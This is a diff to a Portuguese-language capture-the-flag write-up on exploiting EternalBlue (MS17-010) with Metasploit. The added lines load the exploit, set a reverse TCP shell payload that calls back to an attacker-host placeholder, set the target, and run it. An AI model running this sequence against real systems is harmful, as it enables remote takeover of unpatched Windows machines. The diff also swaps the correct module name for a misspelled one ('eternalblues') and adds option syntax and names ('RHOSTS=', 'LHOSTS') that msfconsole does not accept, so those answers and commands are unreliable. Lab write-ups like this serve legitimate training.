@@ -81,4 +81,46 @@ Ou seja, fazer uma busca pela vulnerabilidade detectada na etapa de recon.
 ![search in msfconsole](images/msfconsole_search.png)
 
 
-***Resposta da questão b***: *exploit/windows/smb/ms17_010_eternalblue*
+***Resposta da questão b***: *exploit/windows/smb/ms17_010_eternalblues*
+
+- c. *Show options and set the one required value. What is the name of this value? (All caps for submission)*
+
+Para responder essa questão, primeiro deve-se habilitar o exploit necessário com o comando:
+
+```shell
+use exploit/windows/smb/ms17_010_eternalblue 
+```
+
+Após isso, basta digitar o comando abaixo ara listar as opções do exploit:
+
+```shell
+show options
+```
+![show options](images/msfconsole_show_options.png)
+
+
+***Resposta da questão c***: *RHOSTS*
+
+Antes de executar o exploit, é preciso "setar" o payload, conforme comando abaixo:
+
+```shell
+set payload windows/x64/shell/reverse_tcp
+```
+
+Também é necessário configurar o RHOSTS, conforme comando abaixo:
+
+```shell
+set RHOSTS=IP_DO_ALVO
+```
+
+Também é necessário configurar o LHOSTS, que é host do atacante:
+
+```shell
+set LHOSTS=IP_ATACANTE
+```
+
+Para executar o exploit, basta:
+
+```shell
+run
+```
